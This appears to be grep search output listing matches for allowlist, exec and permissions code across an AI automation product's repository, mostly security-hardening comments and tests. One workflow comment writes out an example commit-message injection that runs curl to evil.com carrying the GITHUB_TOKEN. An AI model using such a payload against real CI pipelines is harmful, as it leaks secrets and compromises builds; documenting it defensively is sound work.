@@ -1,0 +1,1037 @@
+.github/workflows/actions-pinned-check.yml:34:          # Match `uses: <thing>@<ref>` lines that are NOT in the allowlist.
+.github/workflows/release-desktop.yml:158:          # `feat: x ${require('child_process').execSync('curl evil.com?t='+process.env.GITHUB_TOKEN)}`
+.github/workflows/release.yml:44:          # Strict semver allowlist: digits.digits.digits[-prerelease][+build] (no shell metas).
+services/signaling-server/src/index.ts:457:// arbitrary action strings. We now restrict to a strict allowlist that mirrors
+services/signaling-server/src/index.ts:852:  //   1. A valid (allowlisted) Origin header, OR
+apps/extension-vscode/src/services/checkpointManager.ts:20:import { execFile } from 'child_process';
+apps/extension-vscode/src/services/checkpointManager.ts:338:          const match = /stash@\{(\d+)\}/.exec(line);
+apps/extension-vscode/src/services/contextBuilder.ts:13:import { execFile } from 'child_process';
+apps/extension-vscode/src/services/desktopBridge.ts:28: * Returns undefined if the file is missing or has unsafe permissions.
+apps/extension-vscode/src/services/desktopBridge.ts:401:          // VSCODE-03: drop messages with unknown types (message-type allowlist).
+apps/extension/src/side_panel/markdown.ts:6:// `<a target="_blank">` would otherwise open with `window.opener` exposed,
+apps/extension/src/side_panel/markdown.ts:8:// `window.opener.location`. Install an attribute-level hook that hardens
+./services/signaling-server/src/index.ts:457:// arbitrary action strings. We now restrict to a strict allowlist that mirrors
+./services/signaling-server/src/index.ts:852:  //   1. A valid (allowlisted) Origin header, OR
+services/api-gateway/src/routes/llm.ts:368:// allowlist (e.g. only `x-request-id`) — anything else is a security
+apps/desktop/src-tauri/src/data/database/query_builder.rs:64:/// Returns `Err` if the table is not in the allowlist, blocking execution.
+apps/cli/src/policy/linux_sandbox.rs:3://! Wraps a child process under a tight syscall allowlist using seccomp-BPF.
+apps/cli/src/policy/linux_sandbox.rs:9://! 2. Apply via `seccompiler::apply_filter` BEFORE exec(); the wrapped child
+apps/cli/src/policy/linux_sandbox.rs:209:    fn unrestricted_returns_empty_allowlist_sentinel() {
+apps/extension-vscode/src/services/telemetry.ts:67:// ─── Telemetry endpoint allowlist ────────────────────────────────────────────
+apps/extension-vscode/src/services/telemetry.ts:184:  // Security: validate the endpoint against the domain allowlist to prevent data exfiltration
+apps/desktop/src-tauri/src/data/database/mysql_client.rs:199:            .exec(sql, mysql_params)
+apps/desktop/src-tauri/src/data/database/mysql_client.rs:439:            .exec(&call_sql, mysql_params)
+./packages/skills/src/frontmatter.ts:27:  const match = FRONTMATTER_FENCE.exec(source);
+./packages/skills/src/frontmatter.ts:70:    const listMatch = /^\s*-\s+(.*)$/.exec(stripped);
+./packages/skills/src/frontmatter.ts:84:    const keyValueMatch = /^\s*([A-Za-z0-9_$-]+)\s*:(?:\s*(.*))?$/.exec(stripped);
+apps/extension/src/background.ts:580:// EXT-1, EXT-2 (audit 2026-05-03): allowlist-based sender validation.
+apps/extension/src/background.ts:587:// We now gate by an explicit user-managed origin allowlist stored under
+apps/extension/src/background.ts:588:// `chrome.storage.local.agi_site_allowlist`. Extension pages (popup,
+apps/extension/src/background.ts:599:  .get('agi_site_allowlist')
+apps/extension/src/background.ts:601:    const list = res['agi_site_allowlist'];
+apps/extension/src/background.ts:608:  if (area !== 'local' || !changes['agi_site_allowlist']) return;
+apps/extension/src/background.ts:609:  const next = changes['agi_site_allowlist'].newValue;
+apps/extension/src/background.ts:636:// commands. Even with an allowlisted origin, a malicious page must
+apps/extension/src/background.ts:639:// its presence in this set made a future accidental eval()-based handler look
+apps/extension/src/background.ts:641:// expose an eval() surface. Use EXECUTE_SCRIPT + ALLOWED_SCRIPT_OPERATIONS instead.
+apps/extension/src/background.ts:648:// allowlisted page (e.g., a compromised LinkedIn / Lever clone) could send
+apps/extension/src/background.ts:675:  // without this guard, an allowlisted origin could send
+apps/extension/src/background.ts:683:  // write form fields). Without this guard, an allowlisted origin could send
+apps/extension/src/background.ts:712:  // EXT-1/2: gate by user-managed allowlist.
+apps/extension/src/background.ts:714:    logger.warn('Rejected message from non-allowlisted sender', {
+apps/extension/src/background.ts:721:        'This site is not on your AGI Workforce allowlist. Add it from the extension popup to enable automation here.',
+apps/extension/src/background.ts:1294:  // these entries, a malicious script running on an allowlisted page could
+apps/extension/src/background.ts:1307:  // sensitive too. An allowlisted page that calls GET_COOKIES against
+apps/extension/src/background.ts:1992:  const ipv4Match = /^(\d{1,3})\.(\d{1,3})\.(\d{1,3})\.(\d{1,3})$/.exec(h);
+apps/extension/src/background.ts:2097:// SECURITY (C-1): Gateway URL allowlist. The agi_gateway_url key in
+apps/extension/src/background.ts:2098:// chrome.storage.local is writable by any allowlisted page. We therefore
+apps/extension/src/background.ts:2099:// validate the stored value against a strict allowlist rather than trusting the
+apps/extension/src/background.ts:2189: * allowlist but uses the marketing domain (agiworkforce.com) where /api/me
+apps/extension/src/background.ts:2387:  // allowlisted origin or via XSS on an allowlisted site) could craft a
+./packages/skills/src/format.ts:31:  /** Optional filter: only include skills matching this allowlist. */
+./packages/skills/src/format.ts:32:  allowlist?: ReadonlySet<string>;
+./packages/skills/src/format.ts:40:  const filtered = options.allowlist
+./packages/skills/src/format.ts:41:    ? skills.filter((s) => options.allowlist!.has(s.name))
+packages/skills/src/frontmatter.ts:27:  const match = FRONTMATTER_FENCE.exec(source);
+packages/skills/src/frontmatter.ts:70:    const listMatch = /^\s*-\s+(.*)$/.exec(stripped);
+packages/skills/src/frontmatter.ts:84:    const keyValueMatch = /^\s*([A-Za-z0-9_$-]+)\s*:(?:\s*(.*))?$/.exec(stripped);
+apps/extension/src/side_panel.ts:1657:  while ((m = re.exec(content)) !== null) {
+packages/skills/src/format.ts:31:  /** Optional filter: only include skills matching this allowlist. */
+packages/skills/src/format.ts:32:  allowlist?: ReadonlySet<string>;
+packages/skills/src/format.ts:40:  const filtered = options.allowlist
+packages/skills/src/format.ts:41:    ? skills.filter((s) => options.allowlist!.has(s.name))
+apps/extension-vscode/src/services/patchEngine.ts:102:  while ((envelopeMatch = envelopePattern.exec(text)) !== null) {
+apps/extension-vscode/src/services/patchEngine.ts:112:    while ((hunkMatch = hunkPattern.exec(body)) !== null) {
+./packages/llm-runtime/src/errors.ts:572:  const m = CONTEXT_OVERFLOW_REGEX.exec(message);
+apps/desktop/src-tauri/src/automation/uia/tests.rs:425:    fn test_element_registration_and_retrieval() {
+apps/extension/src/autofill/linkedin.ts:184:  const match = /(\d+)\s*\//.exec(text);
+apps/extension/src/content.ts:147:  // Mitigation: only patch console for origins the user explicitly allowlisted
+apps/extension/src/content.ts:148:  // for automation. Non-allowlisted origins skip the patch entirely.
+apps/extension/src/content.ts:1062: * SECURITY: new Function() / eval() is not used. Only pre-defined operations are allowed.
+apps/extension/src/content.ts:1120:  // Any allowlisted origin could invoke these via EXECUTE_SCRIPT, reading or
+apps/extension/src/content.ts:1125:  // callable by any allowlisted origin. Do NOT re-add these three operations.
+apps/extension/src/content.ts:1764: * Wraps `patchConsole` with a same-origin allowlist gate. See chrome-SUB-5
+apps/extension/src/content.ts:1769:  let allowlist: Set<string>;
+apps/extension/src/content.ts:1771:    const res = await chrome.storage.local.get('agi_site_allowlist');
+apps/extension/src/content.ts:1772:    const list = (res as Record<string, unknown>)['agi_site_allowlist'];
+apps/extension/src/content.ts:1773:    allowlist = new Set(Array.isArray(list) ? (list as string[]) : []);
+apps/extension/src/content.ts:1775:    logger.debug('Could not read agi_site_allowlist for console gating', e);
+apps/extension/src/content.ts:1779:  if (!allowlist.has(origin)) {
+apps/extension/src/content.ts:1780:    logger.debug('Console buffering skipped — origin not on user allowlist', { origin });
+apps/extension/src/content.ts:2040:  // [H9 fix] Validate type is a non-empty string in the known message type allowlist
+apps/cli/src/policy/macos_sandbox.rs:170:    fn wrap_command_invokes_sandbox_exec() {
+apps/extension-vscode/src/__tests__/bridgeAllowlists.test.ts:4: * Locks the inbound-message-type and inbound-command allowlists. These are
+apps/desktop/src-tauri/src/automation/computer_use/safety.rs:379:        self.app_permissions.is_some()
+apps/desktop/src-tauri/src/automation/computer_use/anthropic_agent.rs:738:        // `self.app_permissions.decide(app_name, Some(bundle_id)).await`
+apps/desktop/src-tauri/src/automation/computer_use/anthropic_agent.rs:747:        let denied = self.app_permissions.denied_apps().await;
+apps/desktop/src-tauri/src/automation/computer_use/anthropic_agent.rs:750:                "App '{}' is blocked by your automation permissions.",
+apps/desktop/src-tauri/src/automation/computer_use/anthropic_agent.rs:756:        let all_perms = self.app_permissions.list_permissions().await;
+packages/providers/ollama/src/catalog.ts:19:  const match = /^(\d+(?:\.\d+)?)b$/i.exec(text.trim());
+services/api-gateway/src/mcp/sharedClient.ts:15: *   - Config validation already happens in `mcpConfig.ts`'s allowlist;
+services/api-gateway/src/mcp/mcpProxy.ts:20:import { spawn } from 'child_process';
+services/api-gateway/src/mcp/mcpProxy.ts:21:import type { ChildProcessWithoutNullStreams } from 'child_process';
+packages/llm-runtime/src/errors.ts:572:  const m = CONTEXT_OVERFLOW_REGEX.exec(message);
+apps/cli/src/permissions.rs:24:        Ok(crate::config::CliConfig::config_dir()?.join("permissions.toml"))
+apps/cli/src/permissions.rs:32:        let contents = std::fs::read_to_string(&path).context("Failed to read permissions.toml")?;
+apps/cli/src/permissions.rs:34:            toml::from_str(&contents).context("Failed to parse permissions.toml")?;
+apps/cli/src/permissions.rs:43:        std::fs::write(&path, &contents).context("Failed to write permissions.toml")?;
+apps/cli/src/permissions.rs:94:    /// Reset all permissions.
+services/api-gateway/src/mcp/mcpConfig.ts:48:/** Validate that a stdio command is in the allowlist and contains no path separators */
+services/api-gateway/src/mcp/mcpConfig.ts:67:      message: 'Command not in MCP server allowlist or contains disallowed characters',
+apps/desktop/src-tauri/src/automation/computer_use/app_permissions.rs:14:/// regardless of user-configured permissions. Mirrors Claude Cowork's
+apps/desktop/src-tauri/src/automation/computer_use/app_permissions.rs:170:    /// Creates a new manager with no permissions.
+apps/desktop/src-tauri/src/automation/computer_use/app_permissions.rs:177:    /// Creates a manager pre-loaded with permissions.
+apps/desktop/src-tauri/src/automation/computer_use/app_permissions.rs:190:        let perms = self.permissions.read().await;
+apps/desktop/src-tauri/src/automation/computer_use/app_permissions.rs:214:        let perms = self.permissions.read().await;
+apps/desktop/src-tauri/src/automation/computer_use/app_permissions.rs:230:        let mut perms = self.permissions.write().await;
+apps/desktop/src-tauri/src/automation/computer_use/app_permissions.rs:254:        let mut perms = self.permissions.write().await;
+apps/desktop/src-tauri/src/automation/computer_use/app_permissions.rs:276:        let mut perms = self.permissions.write().await;
+apps/desktop/src-tauri/src/automation/computer_use/app_permissions.rs:282:        let perms = self.permissions.read().await;
+apps/desktop/src-tauri/src/automation/computer_use/app_permissions.rs:288:        let perms = self.permissions.read().await;
+apps/desktop/src-tauri/src/automation/computer_use/app_permissions.rs:298:        let perms = self.permissions.read().await;
+apps/desktop/src-tauri/src/automation/computer_use/app_permissions.rs:306:    /// Clears all permissions.
+apps/desktop/src-tauri/src/automation/computer_use/app_permissions.rs:308:        let mut perms = self.permissions.write().await;
+apps/desktop/src-tauri/src/automation/computer_use/app_permissions.rs:314:        let perms = self.permissions.read().await;
+apps/desktop/src-tauri/src/automation/computer_use/app_permissions.rs:322:        let mut perms = self.permissions.write().await;
+apps/extension-vscode/src/__tests__/inlineCompletionProvider.test.ts:17:  const fenced = /```(?:\w+)?\s*\n([\s\S]*?)```/.exec(trimmed);
+apps/cli/src/daemon.rs:921:    // prompt text or partial API responses. Mirrors auth.rs set_file_permissions.
+apps/cli/src/command_registry.rs:525:        assert_eq!(permissions.aliases, vec!["perms", "approvals"]);
+apps/cli/src/command_registry.rs:526:        assert_eq!(permissions.slash_aliases(), vec!["/perms", "/approvals"]);
+apps/cli/src/safety/mod.rs:620:    fn dangerous_eval_exec() {
+apps/cli/src/safety/mod.rs:672:    fn find_safe_without_exec() {
+apps/cli/src/safety/mod.rs:685:    fn find_dangerous_with_exec() {
+apps/cli/src/models/provider_dispatch.rs:249:        // SEV-CLI-04 fix: enforce a scheme allowlist before registering any
+apps/cli/src/mcp/mod.rs:503:    /// a safe allowlist. The manifest env is applied after, but filtered to exclude
+apps/cli/src/mcp/mod.rs:521:        // Re-inject only a minimal safe allowlist from the parent environment.
+apps/cli/src/mcp/mod.rs:1750:    /// Simulate the BLOCKED_MANIFEST_VARS / allowlist logic from spawn_stdio_child
+apps/cli/src/mcp/mod.rs:1862:        // would not reach the child via the allowlist re-injection path.
+apps/cli/src/mcp/mod.rs:1869:            "ANTHROPIC_API_KEY must not be in the parent env allowlist"
+apps/cli/src/mcp/mod.rs:1873:            "OPENAI_API_KEY must not be in the parent env allowlist"
+./services/api-gateway/src/routes/llm.ts:368:// allowlist (e.g. only `x-request-id`) — anything else is a security
+apps/extension-vscode/src/__tests__/applyEdit.test.ts:10:  const langMatch = langPattern.exec(text);
+apps/extension-vscode/src/__tests__/applyEdit.test.ts:16:  const anyMatch = anyPattern.exec(text);
+apps/extension-vscode/src/__tests__/security.test.ts:46:  it('REJECTS http endpoint pointing at non-allowlisted host', () => {
+apps/cli/src/lib.rs:1168:                        cloud::cloud_exec(&cc, prompt, model.as_deref()).await?;
+./crates/agiworkforce-network-proxy/src/state.rs:5:use crate::policy::compile_allowlist_globset;
+./crates/agiworkforce-network-proxy/src/state.rs:28:    pub allowlist_expansion_enabled: Option<bool>,
+./crates/agiworkforce-network-proxy/src/state.rs:62:    crate::config::validate_unix_socket_allowlist_paths(&config)?;
+./crates/agiworkforce-network-proxy/src/state.rs:66:    let allow_set = compile_allowlist_globset(&config.network.allowed_domains)?;
+./crates/agiworkforce-network-proxy/src/state.rs:209:        match constraints.allowlist_expansion_enabled {
+./crates/agiworkforce-network-proxy/src/responses.rs:52:        REASON_NOT_ALLOWED | REASON_NOT_ALLOWED_LOCAL => "blocked-by-allowlist",
+./crates/agiworkforce-network-proxy/src/responses.rs:63:            "Codex blocked this request: domain not in allowlist (this is not a denylist block)."
+./crates/agiworkforce-network-proxy/src/responses.rs:122:            "Codex blocked this request: domain not in allowlist (this is not a denylist block)."
+apps/cli/src/cloud.rs:104:pub async fn cloud_exec(
+./crates/agiworkforce-network-proxy/src/config.rs:250:pub(crate) fn validate_unix_socket_allowlist_paths(cfg: &NetworkProxyConfig) -> Result<()> {
+./crates/agiworkforce-network-proxy/src/config.rs:259:    validate_unix_socket_allowlist_paths(cfg)?;
+./crates/agiworkforce-network-proxy/src/http_proxy.rs:445:    // macOS-only + explicit allowlist by default, to avoid turning the proxy into a general local
+./crates/agiworkforce-network-proxy/src/http_proxy.rs:1029:    async fn http_connect_accept_allows_allowlisted_host_in_full_mode() {
+./crates/agiworkforce-network-proxy/src/http_proxy.rs:1135:    async fn http_plain_proxy_rejects_unix_socket_when_not_allowlisted() {
+./crates/agiworkforce-network-proxy/src/http_proxy.rs:1154:                "blocked-by-allowlist"
+apps/cli/src/a2a/mod.rs:475:    // SSRF allowlist tests
+./crates/agiworkforce-network-proxy/src/certs.rs:138:    // The CA key is a high-value secret. Create it atomically with restrictive permissions.
+./crates/agiworkforce-network-proxy/src/runtime.rs:359:        //  3) allowlist is enforced when configured
+./crates/agiworkforce-network-proxy/src/runtime.rs:364:        let is_allowlisted = allow_set.is_match(host_str);
+./crates/agiworkforce-network-proxy/src/runtime.rs:372:            // allowlisted; hostnames that resolve to local/private IPs are blocked even if
+./crates/agiworkforce-network-proxy/src/runtime.rs:373:            // allowlisted.
+./crates/agiworkforce-network-proxy/src/runtime.rs:389:                if !is_explicit_local_allowlisted(&allowed_domains, &host) {
+./crates/agiworkforce-network-proxy/src/runtime.rs:397:        if allowed_domains_empty || !is_allowlisted {
+./crates/agiworkforce-network-proxy/src/runtime.rs:467:        // respect to the proxy process's CWD and can lead to confusing allowlist behavior).
+./crates/agiworkforce-network-proxy/src/runtime.rs:667:            Self::Allow => "allowlist",
+./crates/agiworkforce-network-proxy/src/runtime.rs:709:    // make the proxy fragile. The allowlist/denylist remains the primary control plane.
+./crates/agiworkforce-network-proxy/src/runtime.rs:726:        "allowlist",
+./crates/agiworkforce-network-proxy/src/runtime.rs:773:fn is_explicit_local_allowlisted(allowed_domains: &[String], host: &Host) -> bool {
+./crates/agiworkforce-network-proxy/src/runtime.rs:828:    use crate::policy::compile_allowlist_globset;
+./crates/agiworkforce-network-proxy/src/runtime.rs:850:    async fn host_blocked_requires_allowlist_match() {
+./crates/agiworkforce-network-proxy/src/runtime.rs:905:    async fn add_denied_domain_forces_block_with_global_wildcard_allowlist() {
+./crates/agiworkforce-network-proxy/src/runtime.rs:938:            allowlist_expansion_enabled: Some(true),
+./crates/agiworkforce-network-proxy/src/runtime.rs:970:            allowlist_expansion_enabled: Some(false),
+./crates/agiworkforce-network-proxy/src/runtime.rs:981:            .expect_err("managed baseline should reject allowlist expansion");
+./crates/agiworkforce-network-proxy/src/runtime.rs:1123:    async fn host_blocked_global_wildcard_allowlist_allows_public_hosts_except_denylist() {
+./crates/agiworkforce-network-proxy/src/runtime.rs:1163:    async fn host_blocked_allows_loopback_when_explicitly_allowlisted_and_local_binding_disabled() {
+./crates/agiworkforce-network-proxy/src/runtime.rs:1177:    async fn host_blocked_allows_private_ip_literal_when_explicitly_allowlisted() {
+./crates/agiworkforce-network-proxy/src/runtime.rs:1191:    async fn host_blocked_rejects_scoped_ipv6_literal_when_not_allowlisted() {
+./crates/agiworkforce-network-proxy/src/runtime.rs:1205:    async fn host_blocked_allows_scoped_ipv6_literal_when_explicitly_allowlisted() {
+./crates/agiworkforce-network-proxy/src/runtime.rs:1233:    async fn host_blocked_rejects_loopback_when_allowlist_empty() {
+./crates/agiworkforce-network-proxy/src/runtime.rs:1268:            allowlist_expansion_enabled: Some(true),
+./crates/agiworkforce-network-proxy/src/runtime.rs:1302:    fn validate_policy_against_constraints_allows_narrowing_wildcard_allowlist() {
+./crates/agiworkforce-network-proxy/src/runtime.rs:1320:    fn validate_policy_against_constraints_rejects_widening_wildcard_allowlist() {
+./crates/agiworkforce-network-proxy/src/runtime.rs:1338:    fn validate_policy_against_constraints_rejects_global_wildcard_in_managed_allowlist() {
+./crates/agiworkforce-network-proxy/src/runtime.rs:1356:    fn validate_policy_against_constraints_rejects_bracketed_global_wildcard_in_managed_allowlist()
+./crates/agiworkforce-network-proxy/src/runtime.rs:1375:    fn validate_policy_against_constraints_rejects_double_wildcard_bracketed_global_wildcard_in_managed_allowlist()
+./crates/agiworkforce-network-proxy/src/runtime.rs:1485:    fn validate_policy_against_constraints_disallows_allow_all_unix_sockets_when_allowlist_is_managed()
+./crates/agiworkforce-network-proxy/src/runtime.rs:1571:        let set = compile_allowlist_globset(&patterns).unwrap();
+./crates/agiworkforce-network-proxy/src/runtime.rs:1660:    async fn unix_socket_allowlist_is_respected_on_macos() {
+./crates/agiworkforce-network-proxy/src/runtime.rs:1679:    async fn unix_socket_allowlist_resolves_symlinks() {
+./crates/agiworkforce-network-proxy/src/runtime.rs:1689:        // The allowlist mechanism is path-based; for test purposes we don't need an actual unix
+./crates/agiworkforce-network-proxy/src/runtime.rs:1708:    async fn unix_socket_allow_all_flag_bypasses_allowlist() {
+./crates/agiworkforce-network-proxy/src/runtime.rs:1721:    async fn unix_socket_allowlist_is_rejected_on_non_macos() {
+apps/cli/src/config.rs:382:        // (auth.json, mcp-oauth.json, permissions.toml) all chmod 0o600 after
+./crates/agiworkforce-network-proxy/src/policy.rs:161:pub(crate) fn compile_allowlist_globset(patterns: &[String]) -> Result<GlobSet> {
+./crates/agiworkforce-network-proxy/src/policy.rs:186:        // - "*": match every host when explicitly enabled for allowlist compilation
+apps/extension-vscode/src/utils/api.ts:194: * - Host must be in the allowlist OR be localhost/127.0.0.1
+apps/extension-vscode/src/utils/api.ts:240: * URL is additionally validated against the host allowlist.
+./crates/agiworkforce-network-proxy/src/mitm.rs:277:    // CONNECT already handled allowlist/denylist + decider policy. Re-check local/private
+apps/extension-vscode/src/utils/applyEdit.ts:19:  const langMatch = langPattern.exec(text);
+apps/extension-vscode/src/utils/applyEdit.ts:26:  const anyMatch = anyPattern.exec(text);
+apps/extension/__tests__/security-fixes.test.ts:31:describe('C-1 validateGatewayUrl — allowlist enforcement', () => {
+apps/extension/__tests__/security-fixes.test.ts:173:  it('set is empty — no types bypass allowlist checks', () => {
+apps/extension/__tests__/security-fixes.test.ts:316:// allowlisted page could send `{ type: 'RUN_PAGE_ACTIONS', tabId: <other> }`
+apps/extension/__tests__/security-fixes.test.ts:589:// ─── CHROME-SUB-5: console buffering gated by allowlist ──────────────────────
+apps/extension/__tests__/security-fixes.test.ts:595:describe('CHROME-SUB-5 console buffering gated by user allowlist', () => {
+apps/extension/__tests__/security-fixes.test.ts:605:  it('initialize() routes through the allowlist-gated wrapper', () => {
+apps/extension/__tests__/security-fixes.test.ts:609:  it('patchConsoleIfAllowlisted reads agi_site_allowlist from chrome.storage.local', () => {
+apps/extension/__tests__/security-fixes.test.ts:611:      /async function patchConsoleIfAllowlisted[\s\S]*chrome\.storage\.local\.get\('agi_site_allowlist'/,
+apps/extension/__tests__/security-fixes.test.ts:615:  it('patchConsoleIfAllowlisted compares window.location.origin against the allowlist set', () => {
+apps/extension/__tests__/security-fixes.test.ts:619:    expect(slice).toMatch(/allowlist\.has\(/);
+apps/extension/__tests__/security-fixes.test.ts:627:// mutation guard set, an allowlisted page could send
+apps/extension-vscode/src/providers/chatEditorPanel.ts:310:    while ((fileRefMatch = fileRefPattern.exec(text)) !== null) {
+apps/extension-vscode/src/providers/inlineCompletionProvider.ts:69:  const fenced = /```(?:\w+)?\s*\n([\s\S]*?)```/.exec(trimmed);
+apps/extension/__tests__/content.test.ts:351:// SET_ATTRIBUTE — security allowlist
+apps/extension/__tests__/content.test.ts:406:// EXECUTE_SCRIPT — allowlist enforcement
+apps/extension/__tests__/content.test.ts:409:describe('handleMessage — EXECUTE_SCRIPT allowlist', () => {
+apps/extension-vscode/src/providers/agentMode/agentLoop.ts:45:  while ((match = editPattern.exec(response)) !== null) {
+apps/extension-vscode/src/providers/agentMode/agentLoop.ts:65:  while ((match = readPattern.exec(response)) !== null) {
+apps/extension-vscode/src/providers/sidebar/ChatStateManager.ts:442:    while ((fileRefMatch = fileRefPattern.exec(text)) !== null) {
+apps/cli/src/tui/app.rs:729:                    additional_permissions: ev.additional_permissions.clone(),
+apps/cli/src/tui/app.rs:768:                    permissions: ev.permissions.clone(),
+apps/cli/src/tui/app.rs:1557:                    app.config.permissions.sandbox_policy.get(),
+apps/cli/src/tui/app.rs:1571:                let sandbox_policy = app.config.permissions.sandbox_policy.get().clone();
+apps/cli/src/tui/app.rs:2386:                    let policy = self.config.permissions.sandbox_policy.get().clone();
+apps/cli/src/tui/app.rs:2467:                                self.config.permissions.windows_sandbox_mode,
+apps/cli/src/tui/app.rs:2741:                    Some(self.config.permissions.approval_policy.value());
+apps/cli/src/tui/app.rs:2743:                    .set_approval_policy(self.config.permissions.approval_policy.value());
+apps/cli/src/tui/app.rs:2771:                    Some(self.config.permissions.sandbox_policy.get().clone());
+apps/cli/src/tui/app.rs:2792:                        let sandbox_policy = self.config.permissions.sandbox_policy.get().clone();
+apps/cli/src/tui/app.rs:4793:            app.config.permissions.approval_policy.value(),
+apps/cli/src/tui/app.rs:4902:            app.config.permissions.approval_policy.value(),
+apps/cli/src/tui/app.rs:4979:            app.config.permissions.approval_policy.value(),
+./services/api-gateway/src/mcp/sharedClient.ts:15: *   - Config validation already happens in `mcpConfig.ts`'s allowlist;
+./services/api-gateway/src/mcp/mcpProxy.ts:20:import { spawn } from 'child_process';
+./services/api-gateway/src/mcp/mcpProxy.ts:21:import type { ChildProcessWithoutNullStreams } from 'child_process';
+./services/api-gateway/src/mcp/mcpConfig.ts:48:/** Validate that a stdio command is in the allowlist and contains no path separators */
+./services/api-gateway/src/mcp/mcpConfig.ts:67:      message: 'Command not in MCP server allowlist or contains disallowed characters',
+services/api-gateway/src/websocket.ts:151:// allowlist of command types and a small payload schema for each. New
+apps/cli/src/tui/chatwidget.rs:1154:            self.config.permissions.approval_policy =
+apps/cli/src/tui/chatwidget.rs:1164:            self.config.permissions.sandbox_policy =
+apps/cli/src/tui/chatwidget.rs:3550:            approval_policy: self.config.permissions.approval_policy.value(),
+apps/cli/src/tui/chatwidget.rs:3552:            sandbox_policy: self.config.permissions.sandbox_policy.get().clone(),
+apps/cli/src/tui/chatwidget.rs:5281:        let current_approval = self.config.permissions.approval_policy.value();
+apps/cli/src/tui/chatwidget.rs:5282:        let current_sandbox = self.config.permissions.sandbox_policy.get();
+apps/cli/src/tui/chatwidget.rs:5587:            self.config.permissions.sandbox_policy.get(),
+apps/cli/src/tui/chatwidget.rs:5705:            .unwrap_or_else(|| describe_policy(self.config.permissions.sandbox_policy.get()));
+apps/cli/src/tui/chatwidget.rs:6076:        if let Err(err) = self.config.permissions.approval_policy.set(policy) {
+apps/cli/src/tui/chatwidget.rs:6084:        self.config.permissions.sandbox_policy.set(policy)?;
+apps/cli/src/tui/chatwidget.rs:6090:        self.config.permissions.windows_sandbox_mode = mode;
+./services/api-gateway/src/websocket.ts:151:// allowlist of command types and a small payload schema for each. New
+apps/cli/src/tui/chatwidget/tests.rs:466:        chat.config_ref().permissions.approval_policy.value(),
+apps/cli/src/tui/chatwidget/tests.rs:470:        chat.config_ref().permissions.sandbox_policy.get(),
+apps/cli/src/tui/chatwidget/tests.rs:3766:fn begin_exec(chat: &mut ChatWidget, call_id: &str, raw_cmd: &str) -> ExecCommandBeginEvent {
+apps/cli/src/tui/chatwidget/tests.rs:3770:fn end_exec(
+apps/cli/src/tui/chatwidget/tests.rs:4190:    begin_exec(&mut chat, "call-1", "echo hi");
+apps/cli/src/tui/chatwidget/tests.rs:5241:    let begin = begin_exec(&mut chat, "call-1", "echo done");
+apps/cli/src/tui/chatwidget/tests.rs:5247:    end_exec(&mut chat, begin, "done", "", 0);
+apps/cli/src/tui/chatwidget/tests.rs:5271:    let begin = begin_exec(&mut chat, "call-2", "false");
+apps/cli/src/tui/chatwidget/tests.rs:5276:    end_exec(&mut chat, begin, "", "Bloop", 2);
+apps/cli/src/tui/chatwidget/tests.rs:5339:    begin_exec(&mut chat, "call-exploring", "cat /dev/null");
+apps/cli/src/tui/chatwidget/tests.rs:5347:    end_exec(&mut chat, orphan, "repro-marker\n", "", 0);
+apps/cli/src/tui/chatwidget/tests.rs:5376:    let begin_ls = begin_exec(&mut chat, "call-ls", "ls -la");
+apps/cli/src/tui/chatwidget/tests.rs:5377:    end_exec(&mut chat, begin_ls, "", "", 0);
+apps/cli/src/tui/chatwidget/tests.rs:5382:    end_exec(&mut chat, orphan, "after\n", "", 0);
+apps/cli/src/tui/chatwidget/tests.rs:5414:    let begin_ls = begin_exec(&mut chat, "call-ls", "ls -la");
+apps/cli/src/tui/chatwidget/tests.rs:5415:    let begin_cat = begin_exec(&mut chat, "call-cat", "cat foo.txt");
+apps/cli/src/tui/chatwidget/tests.rs:5418:    end_exec(&mut chat, begin_ls, "foo.txt\n", "", 0);
+apps/cli/src/tui/chatwidget/tests.rs:5439:    end_exec(&mut chat, begin_cat, "hello\n", "", 0);
+apps/cli/src/tui/chatwidget/tests.rs:5458:    end_exec(&mut chat, begin, "echo unified exec startup\n", "", 0);
+apps/cli/src/tui/chatwidget/tests.rs:5480:    end_exec(&mut chat, begin, "", "", 0);
+apps/cli/src/tui/chatwidget/tests.rs:5491:    begin_exec(&mut chat, "call-exploring", "cat /dev/null");
+apps/cli/src/tui/chatwidget/tests.rs:5494:    end_exec(&mut chat, orphan, "repro-marker\n", "", 0);
+apps/cli/src/tui/chatwidget/tests.rs:5523:    end_exec(&mut chat, begin, "", "", 0);
+apps/cli/src/tui/chatwidget/tests.rs:6880:    begin_exec(&mut chat, "call-int", "sleep 1");
+apps/cli/src/tui/chatwidget/tests.rs:9235:    let begin_ls = begin_exec(&mut chat, "call-ls", "ls -la");
+apps/cli/src/tui/chatwidget/tests.rs:9239:    end_exec(&mut chat, begin_ls, "", "", 0);
+apps/cli/src/tui/chatwidget/tests.rs:9243:    let begin_cat_foo = begin_exec(&mut chat, "call-cat-foo", "cat foo.txt");
+apps/cli/src/tui/chatwidget/tests.rs:9247:    end_exec(&mut chat, begin_cat_foo, "hello from foo", "", 0);
+apps/cli/src/tui/chatwidget/tests.rs:9251:    let begin_sed_range = begin_exec(&mut chat, "call-sed-range", "sed -n 100,200p foo.txt");
+apps/cli/src/tui/chatwidget/tests.rs:9252:    end_exec(&mut chat, begin_sed_range, "chunk", "", 0);
+apps/cli/src/tui/chatwidget/tests.rs:9256:    let begin_cat_bar = begin_exec(&mut chat, "call-cat-bar", "cat bar.txt");
+apps/cli/src/tui/chatwidget/tests.rs:9257:    end_exec(&mut chat, begin_cat_bar, "hello from bar", "", 0);
+apps/cli/src/tui/chatwidget/tests.rs:9271:    end_exec(&mut chat, begin_ls, "file1\nfile2\n", "", 0);
+apps/cli/src/tui/chatwidget/tests.rs:9390:    chat.config.permissions.approval_policy =
+apps/cli/src/tui/chatwidget/tests.rs:9426:    chat.config.permissions.approval_policy =
+apps/cli/src/tui/chatwidget/tests.rs:10368:    end_exec(&mut chat, begin, "", "", 0);
+apps/desktop/src-tauri/src/sys/error/translator.rs:236:                suggestion: "Please choose a different location or check file permissions."
+apps/desktop/src-tauri/src/sys/error/translator.rs:246:                suggestion: "Please check the file path and permissions.".to_string(),
+apps/cli/src/tui/app/config.rs:86:            && let Err(err) = config.permissions.approval_policy.set(*policy)
+apps/cli/src/tui/app/config.rs:94:            && let Err(err) = config.permissions.sandbox_policy.set(policy.clone())
+apps/cli/src/tui/app/config.rs:115:        if let Err(err) = config.permissions.approval_policy.set(policy) {
+apps/cli/src/tui/app/config.rs:132:        if let Err(err) = config.permissions.sandbox_policy.set(policy) {
